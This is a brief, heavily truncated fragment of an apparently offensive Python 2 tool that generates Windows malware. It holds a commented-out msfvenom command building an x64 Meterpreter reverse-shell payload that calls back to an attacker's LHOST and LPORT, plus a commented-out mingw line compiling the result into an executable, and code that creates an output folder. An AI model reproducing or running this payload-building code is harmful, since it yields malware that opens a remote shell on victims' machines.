...
""",'blue')
	...
	#raw_payload='msfvenom -p windows/x64/meterpreter/reverse_'+payload_type+' LHOST='+ lhost +' LPORT='+ lport +' EXITFUNC=process --platform windows -a x64 -f raw -o test.raw'
	...
	if not os.path.isdir("./result"):
		os.makedirs("./result")
		print colored(color("[+] Creating [./result] directory for resulting code files","red"))
	...
	#64x_mingw="x86_64-w64-mingw32-gcc "+Filename+" -o final_"+lport+".exe"
